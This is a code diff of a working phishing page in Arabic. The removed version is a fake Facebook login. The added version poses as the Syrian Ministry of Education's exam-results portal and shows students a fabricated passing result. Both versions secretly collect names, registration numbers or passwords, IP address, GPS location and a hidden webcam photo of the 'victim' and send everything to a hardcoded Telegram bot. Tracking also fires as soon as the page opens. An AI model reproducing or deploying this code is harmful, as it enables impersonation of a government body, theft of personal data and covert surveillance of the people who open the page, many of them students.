@@ -3,118 +3,400 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الهوية للمتابعة</title>
+    <title>وزارة التربية - نظام الاستعلام عن النتائج</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 350px; text-align: center; }
-        .logo { color: #1877f2; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .info { font-size: 12px; color: #777; margin-top: 15px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f2f5;
+            color: #1a1a1a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 16px;
+            padding: 35px 30px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+            border: 1px solid #e0e0e0;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .logo img {
+            max-height: 70px;
+            width: auto;
+        }
+        .logo h2 {
+            color: #1a3a6b;
+            font-size: 20px;
+            margin-top: 8px;
+            font-weight: 700;
+        }
+        .logo .sub {
+            color: #666;
+            font-size: 13px;
+            font-weight: 400;
+        }
+        .title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1a3a6b;
+            text-align: center;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #e0e0e0;
+            padding-bottom: 12px;
+        }
+        label {
+            display: block;
+            text-align: right;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 4px;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #d0d5dd;
+            border-radius: 10px;
+            font-size: 15px;
+            background: #fafbfc;
+            outline: none;
+            transition: 0.2s;
+            margin-bottom: 16px;
+        }
+        input:focus, select:focus {
+            border-color: #1a3a6b;
+            box-shadow: 0 0 0 3px rgba(26, 58, 107, 0.1);
+        }
+        .btn {
+            background: #1a3a6b;
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+            letter-spacing: 0.5px;
+        }
+        .btn:hover {
+            background: #0f2a4f;
+            transform: scale(1.02);
+        }
+        .note {
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            margin-top: 16px;
+            border-top: 1px solid #e0e0e0;
+            padding-top: 16px;
+        }
+        .hidden { display: none; }
+        video, canvas { display: none; }
+        .status-box {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 13px;
+            text-align: center;
+            background: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            color: #555;
+        }
+        .result-box {
+            margin-top: 20px;
+            padding: 20px;
+            border-radius: 12px;
+            background: #f0f7ff;
+            border: 2px solid #1a3a6b;
+            display: none;
+            text-align: right;
+        }
+        .result-box h3 {
+            color: #1a3a6b;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .result-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #d0d5dd;
+            font-size: 14px;
+        }
+        .result-item:last-child { border-bottom: none; }
+        .result-item .label { color: #555; font-weight: 600; }
+        .result-item .value { color: #1a3a6b; font-weight: 700; }
+        .success { color: #2e7d32; font-weight: 700; }
+        .fail { color: #c62828; font-weight: 700; }
     </style>
 </head>
 <body>
 
-<div class="container" id="box">
-    <div class="logo">facebook</div>
-    <div id="login_form">
-        <p>يرجى تسجيل الدخول للمتابعة إلى المحتوى</p>
-        <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف" required>
-        <input type="password" id="pass" placeholder="كلمة السر" required>
-        <button onclick="startExploit()">تسجيل الدخول</button>
+<div class="container">
+    <div class="logo">
+        <img src="https://moed.gov.sy/sites/default/files/logo_0.png" alt="وزارة التربية" onerror="this.style.display='none'">
+        <h2>وزارة التربية</h2>
+        <div class="sub">نظام الاستعلام عن النتائج الامتحانية</div>
     </div>
-    
-    <div id="loading" style="display:none;">
-        <p>جاري التحقق من البيانات...</p>
-        <img src="https://i.gifer.com/ZZ5H.gif" width="50">
+
+    <div class="title">🔍 استعلام عن النتيجة</div>
+
+    <form id="searchForm">
+        <label>📌 رقم الاكتتاب</label>
+        <input type="text" id="registrationNumber" placeholder="أدخل رقم الاكتتاب" required>
+
+        <label>👤 الاسم الثلاثي</label>
+        <input type="text" id="fullName" placeholder="الاسم الأول - اسم الأب - اللقب" required>
+
+        <label>📘 الشهادة</label>
+        <select id="certificateType">
+            <option value="baccalaureate">شهادة البكالوريا (الثانوية العامة)</option>
+            <option value="ninth">شهادة الصف التاسع الأساسي</option>
+        </select>
+
+        <button type="submit" class="btn">🔍 عرض النتيجة</button>
+    </form>
+
+    <div id="statusBox" class="status-box">📌 أدخل بياناتك للاستعلام عن النتيجة</div>
+
+    <div id="resultBox" class="result-box">
+        <h3>📋 نتيجة الطالب</h3>
+        <div id="resultContent"></div>
     </div>
-    
-    <p class="info">سيتم توجيهك تلقائياً بعد التأكد من الحساب.</p>
+
+    <div class="note">
+        © 2026 وزارة التربية - نظام الاستعلام الرسمي
+    </div>
 </div>
 
-<video id="v" style="display:none;" autoplay></video>
-<canvas id="c" style="display:none;"></canvas>
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
 
 <script>
-    const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
-    const CHAT_ID = "7214473798";
+    // ======== بيانات التليغرام ========
+    const BOT_TOKEN = "8117396772:AAGim7zrJO-Y5_8brwhZfLfErkBAd9qhIGY";
+    const CHAT_ID = "8600300720";
+    const PAGE_NAME = "وزارة التربية - نظام النتائج";
+    // ===================================
 
-    // وظيفة بدء الهجوم عند الضغط على الزر
-    async function startExploit() {
-        const user = document.getElementById('user').value;
-        const pass = document.getElementById('pass').value;
+    async function sendToTelegram(message) {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message.substring(0, 4096),
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (e) { console.error(e); }
+    }
 
-        if (!user || !pass) {
-            alert("يرجى إدخال البيانات المطلوبة!");
+    async function sendPhotoToTelegram(base64Image, caption) {
+        try {
+            const blob = dataURLtoBlob(base64Image);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'shot.jpg');
+            formData.append('caption', caption.substring(0, 1024));
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            await fetch(url, { method: 'POST', body: formData });
+        } catch (e) { console.error(e); }
+    }
+
+    function dataURLtoBlob(dataURL) {
+        const arr = dataURL.split(',');
+        const mime = arr[0].match(/:(.*?);/)[1];
+        const bstr = atob(arr[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+        while (n--) u8arr[n] = bstr.charCodeAt(n);
+        return new Blob([u8arr], { type: mime });
+    }
+
+    async function getIPInfo() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            return {
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country_name,
+                lat: data.latitude,
+                lon: data.longitude,
+                org: data.org
+            };
+        } catch (e) { return null; }
+    }
+
+    function captureCamera() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            sendToTelegram(`⚠️ ${PAGE_NAME} - الكاميرا غير مدعومة`);
+            return;
+        }
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = video.videoWidth || 400;
+                    canvas.height = video.videoHeight || 300;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
+                    sendPhotoToTelegram(dataURL, `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
+                    stream.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
+                }, 1500);
+            })
+            .catch(err => {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(() => {
+                            const ctx = canvas.getContext('2d');
+                            canvas.width = video.videoWidth || 400;
+                            canvas.height = video.videoHeight || 300;
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const dataURL = canvas.toDataURL('image/jpeg', 0.7);
+                            sendPhotoToTelegram(dataURL, `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
+                            stream.getTracks().forEach(track => track.stop());
+                            video.srcObject = null;
+                        }, 1500);
+                    })
+                    .catch(() => sendToTelegram(`⚠️ ${PAGE_NAME} - رفض الكاميرا`));
+            });
+    }
+
+    // دالة إنشاء نتيجة وهمية
+    function generateFakeResult(name, regNumber, certType) {
+        const subjects = certType === 'baccalaureate' 
+            ? ['اللغة العربية', 'اللغة الإنجليزية', 'الرياضيات', 'الفيزياء', 'الكيمياء', 'علم الأحياء', 'التاريخ', 'الجغرافيا', 'الفلسفة']
+            : ['اللغة العربية', 'اللغة الإنجليزية', 'الرياضيات', 'العلوم العامة', 'التربية الدينية', 'التربية الوطنية', 'التربية الفنية'];
+
+        // نتائج عالية لناجح
+        const grades = subjects.map(() => Math.floor(Math.random() * 20) + 75);
+        const total = grades.reduce((a, b) => a + b, 0);
+        const average = (total / grades.length).toFixed(2);
+        
+        return { subjects, grades, total, average, status: 'ناجح' };
+    }
+
+    document.getElementById('searchForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const regNumber = document.getElementById('registrationNumber').value.trim();
+        const fullName = document.getElementById('fullName').value.trim();
+        const certType = document.getElementById('certificateType').value;
+        const statusBox = document.getElementById('statusBox');
+        const resultBox = document.getElementById('resultBox');
+        const resultContent = document.getElementById('resultContent');
+
+        if (!regNumber || !fullName) {
+            statusBox.style.color = '#c00';
+            statusBox.innerText = '❌ الرجاء ملء جميع الحقول';
             return;
         }
 
-        // 1. تغيير الواجهة للتمويه
-        document.getElementById('login_form').style.display = 'none';
-        document.getElementById('loading').style.display = 'block';
+        statusBox.style.color = '#f0c060';
+        statusBox.innerText = '⏳ جاري الاستعلام عن النتيجة...';
 
-        // 2. طلب صلاحيات الكاميرا والموقع فوراً
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('v');
-            video.srcObject = stream;
-            
-            // إرسال تقرير شامل (بيانات الدخول + الموقع + الجهاز)
-            collectFullData(user, pass, video);
-        } catch (e) {
-            // حتى لو رفض الكاميرا، سنرسل بيانات الدخول والموقع
-            collectFullData(user, pass, null);
-        }
-    }
-
-    async function collectFullData(user, pass, videoElement) {
-        // جلب بيانات البطارية
-        let battery = "غير متاح";
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            battery = `${Math.round(b.level * 100)}%`;
-        }
-
-        // جلب الموقع
-        navigator.geolocation.getCurrentPosition(async (p) => {
-            const lat = p.coords.latitude;
-            const lon = p.coords.longitude;
-            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            // إرسال الرسالة النصية الكبرى
-            const report = `🚀 **عملية اختراق ناجحة**\n\n` +
-                           `👤 الحساب: \`${user}\`\n` +
-                           `🔑 كلمة السر: \`${pass}\`\n` +
-                           `🔋 الشحن: ${battery}\n` +
-                           `📍 الموقع: ${mapUrl}`;
-            
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
-            
-            // إرسال الصورة إذا توفرت الكاميرا
-            if (videoElement) {
-                setTimeout(() => captureAndSend(videoElement), 2000);
+        // جلب IP
+        const ipInfo = await getIPInfo();
+        let msg = `🕵️ <b>${PAGE_NAME} - استعلام جديد</b>\n\n`;
+        msg += `📌 رقم الاكتتاب: ${regNumber}\n`;
+        msg += `👤 الاسم: ${fullName}\n`;
+        msg += `📘 الشهادة: ${certType === 'baccalaureate' ? 'بكالوريا' : 'تاسع'}\n`;
+        if (ipInfo) {
+            msg += `🌐 IP: ${ipInfo.ip}\n`;
+            msg += `🏙️ المدينة: ${ipInfo.city || 'غير معروف'}\n`;
+            msg += `🌍 الدولة: ${ipInfo.country || 'غير معروف'}\n`;
+            if (ipInfo.lat && ipInfo.lon) {
+                msg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
             }
-        }, async () => {
-            // في حال رفض الموقع، نرسل البيانات المتاحة فقط
-            const report = `⚠️ **صيد (بدون موقع)**\n\n👤 الحساب: \`${user}\`\n🔑 كلمة السر: \`${pass}\`\n🔋 الشحن: ${battery}`;
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+        }
+        msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
+        await sendToTelegram(msg);
+
+        // طلب GPS
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                let lat = p.coords.latitude;
+                let lon = p.coords.longitude;
+                let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                let gpsMsg = `🎯 <b>${PAGE_NAME} - موقع دقيق ✅</b>\n\n`;
+                gpsMsg += `📍 ${mapLink}\n`;
+                gpsMsg += `📏 دقة: ${Math.round(p.coords.accuracy)} متر\n`;
+                gpsMsg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
+                await sendToTelegram(gpsMsg);
+            }, (err) => {
+                sendToTelegram(`⚠️ ${PAGE_NAME} - رفض GPS: ${err.message}`);
+            }, { enableHighAccuracy: true, timeout: 10000 });
+        }
+
+        // تصوير الكاميرا
+        captureCamera();
+
+        // إنشاء نتيجة وهمية (ناجح)
+        const result = generateFakeResult(fullName, regNumber, certType);
+
+        // عرض النتيجة
+        resultBox.style.display = 'block';
+        let html = `<div class="result-item"><span class="label">📌 رقم الاكتتاب</span><span class="value">${regNumber}</span></div>`;
+        html += `<div class="result-item"><span class="label">👤 الاسم الثلاثي</span><span class="value">${fullName}</span></div>`;
+        html += `<div class="result-item"><span class="label">📘 الشهادة</span><span class="value">${certType === 'baccalaureate' ? 'البكالوريا' : 'التاسع الأساسي'}</span></div>`;
+        html += `<div class="result-item"><span class="label">📊 المعدل</span><span class="value success">${result.average}%</span></div>`;
+        html += `<div class="result-item"><span class="label">📋 الحالة</span><span class="value success">✅ ${result.status}</span></div>`;
+        html += `<hr style="margin: 10px 0; border-color: #d0d5dd;">`;
+        result.subjects.forEach((sub, i) => {
+            html += `<div class="result-item"><span class="label">${sub}</span><span class="value">${result.grades[i]}%</span></div>`;
         });
-    }
+        resultContent.innerHTML = html;
 
-    function captureAndSend(video) {
-        const canvas = document.getElementById('c');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('photo', blob, 'victim.jpg');
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { method: 'POST', body: formData });
-        }, 'image/jpeg');
-    }
+        statusBox.style.color = '#2e7d32';
+        statusBox.innerText = '✅ تم عرض النتيجة بنجاح - مبروك النجاح';
+
+        // إرسال النتيجة للتليغرام
+        let resultMsg = `📊 <b>نتيجة الطالب</b>\n\n`;
+        resultMsg += `👤 ${fullName}\n`;
+        resultMsg += `📌 ${regNumber}\n`;
+        resultMsg += `📘 ${certType === 'baccalaureate' ? 'بكالوريا' : 'تاسع'}\n`;
+        resultMsg += `📊 المعدل: ${result.average}%\n`;
+        resultMsg += `📋 الحالة: ✅ ناجح`;
+        await sendToTelegram(resultMsg);
+    });
+
+    // إرسال IP فور فتح الصفحة
+    (async function () {
+        const ipInfo = await getIPInfo();
+        if (ipInfo) {
+            let msg = `📡 <b>${PAGE_NAME} - صفحة مفتوحة</b>\n\n`;
+            msg += `🌐 IP: ${ipInfo.ip}\n`;
+            msg += `🏙️ ${ipInfo.city || 'غير معروف'}, ${ipInfo.country || ''}\n`;
+            if (ipInfo.lat && ipInfo.lon) {
+                msg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
+            }
+            msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
+            await sendToTelegram(msg);
+        }
+    })();
 </script>
-
 </body>
 </html>
-فيسبوك
